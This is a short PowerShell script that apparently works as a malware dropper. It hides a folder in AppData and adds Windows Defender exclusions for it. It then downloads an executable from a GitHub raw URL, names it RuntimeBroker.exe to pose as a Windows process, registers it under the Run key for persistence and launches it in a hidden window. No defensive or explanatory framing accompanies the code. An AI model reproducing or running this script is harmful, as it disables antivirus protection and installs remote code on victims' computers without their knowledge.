#Requires -Version 5.1
$ErrorActionPreference = 'SilentlyContinue'

# 1. Create hidden folder in AppData
$hiddenDir = "$env:APPDATA\Apdata"
if (-not (Test-Path $hiddenDir)) {
    New-Item -Path $hiddenDir -ItemType Directory -Force | Out-Null
    (Get-Item $hiddenDir).Attributes = 'Hidden'
}

# 2. Add exclusions to Windows Defender
try {
    $subDir = 'C:\Windows\System32\config\systemprofile\AppData\Roaming\SubDir'
    Add-MpPreference -ExclusionPath $hiddenDir -ErrorAction Stop
    Add-MpPreference -ExclusionPath $subDir -ErrorAction Stop
} catch {
    Write-Warning "Failed to add Windows Defender exclusions. Continuing anyway."
}

# 3. Download and execute file
$url = 'https://github.com/salamprajjit-alt/5132525231/raw/main/Runtime%20Broker.exe'
$output = "$hiddenDir\RuntimeBroker.exe"

try {
    # Download the file
    Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing -ErrorAction Stop
    
    # Set startup persistence via registry
    $regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    Set-ItemProperty -Path $regPath -Name 'RuntimeBroker' -Value "`"$output`"" -Force -ErrorAction Stop
    
    # Execute the file
    Start-Process -FilePath $output -WindowStyle Hidden -ErrorAction Stop
    
    Write-Host "Operation completed successfully." -ForegroundColor Green
} catch {
    Write-Warning "An error occurred during download or execution: $($_.Exception.Message)"
}